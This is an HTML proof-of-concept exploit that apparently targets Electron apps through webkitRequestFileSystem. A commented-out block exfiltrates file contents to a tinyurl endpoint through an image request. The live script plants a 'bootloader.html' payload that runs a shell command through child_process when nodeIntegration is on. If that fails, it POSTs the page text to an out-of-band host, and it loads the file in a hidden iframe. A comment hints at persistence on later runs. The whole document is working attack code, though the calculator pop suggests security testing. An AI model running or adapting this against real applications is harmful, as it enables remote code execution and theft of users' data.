<!-- <!DOCTYPE html>
<html>
<head>
  <title>Electron FileSystem Exploit</title>
</head>
<body>
  <h1>Testing webkitRequestFileSystem</h1>
  <script>
    const EXFIL_URL = 'https://tinyurl.com/yz885dsu/leak';

    // Request temporary file system
    webkitRequestFileSystem(TEMPORARY, 1024 * 1024, function(fs) {
      // Create a file
      fs.root.getFile('exploit.txt', { create: true }, function(fileEntry) {
        // Create writer and write to file
        fileEntry.createWriter(function(writer) {
          const content = "stolen_token=abc123;secret=leaked!";
          const blob = new Blob([content], { type: 'text/plain' });
          
          writer.write(blob);

          // After write is done, read back the file
          writer.onwriteend = function() {
            fileEntry.file(function(file) {
              const reader = new FileReader();
              reader.onloadend = function() {
                // Exfiltrate file content
                const leak = new Image();
                leak.src = EXFIL_URL + '?data=' + encodeURIComponent(reader.result);
              };
              reader.readAsText(file);
            });
          };
        }, function(err) {
          console.error('CreateWriter error:', err);
        });
      }, function(err) {
        console.error('GetFile error:', err);
      });
    }, function(err) {
      console.error('RequestFileSystem error:', err);
    });
  </script>
</body>
</html>
 -->

<script>
webkitRequestFileSystem(PERSISTENT, 1024 * 1024, function(fs) {
  fs.root.getFile('bootloader.html', { create: true }, function(fileEntry) {
    fileEntry.createWriter(function(writer) {
      const payload = `
        <style>*{all:unset!important;color:red;font-size:30px}</style>
        <script>
          // RCE for Electron with nodeIntegration
          try {
            require('child_process').exec('open -a Calculator');
          } catch (e) {
            // fallback to token exfiltration
            fetch('https://your-oast.com/xss', {
              method: 'POST',
              body: document.body.innerText
            });
          }
        <\/script>
      `;
      writer.write(new Blob([payload], { type: 'text/html' }));
      writer.onwriteend = function() {
        // load file now (auto-load on future runs can be triggered via injected preload or component)
        const url = fileEntry.toURL();
        const iframe = document.createElement('iframe');
        iframe.src = url;
        iframe.style = "width:0;height:0;display:none";
        document.body.appendChild(iframe);
      };
    });
  });
});
</script>
